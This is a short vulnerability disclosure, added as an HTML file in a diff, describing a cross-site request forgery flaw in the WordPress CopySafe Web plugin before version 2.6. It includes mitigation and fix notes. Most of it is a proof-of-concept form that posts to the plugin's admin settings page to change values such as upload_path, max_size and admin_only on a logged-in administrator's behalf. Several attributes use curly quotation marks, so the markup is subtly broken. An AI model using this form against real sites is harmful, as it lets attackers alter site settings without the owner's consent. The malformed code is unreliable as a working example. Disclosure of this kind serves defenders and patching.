@@ -1,0 +1,40 @@
+<!--
+=======
+Software: CopySafe Web
+version: <2.6
+description: Add copy protection from PrintScreen and screen capture. Copysafe Web uses encrypted images and domain lock to extend copy protection for all media displayed on a web page.
+========
+
+Description
+==========
+CSRF in wordpress copysafe web allows attacker changes plugin settings
+
+========
+
+POC:
+=======
+-->
+
+<form method="POST" action="http://127.0.0.1/wordpress/wp-admin/admin.php?page=wpcsw_settings">
+
+  <input type="text" name= "admin_only" value="checked">
+
+ <input type="text" name="asps" value="">
+ <input type="text" name="upload_path" value="">
+ <input type="text" name="max_size" value="">
+ <input type="text" name="mode" value=“checked”>
+ <input type=“text” name="submit” value="Save Settings”>
+   <input type="submit”>
+</form>
+
+<!--
+
+=========
+Mitigations
+================
+Disable the plugin until a new version is released that fixes this bug.
+
+Fixed
+=========
+https://wordpress.org/plugins/wp-copysafe-web/ changelog ->2.6 realease
+-->
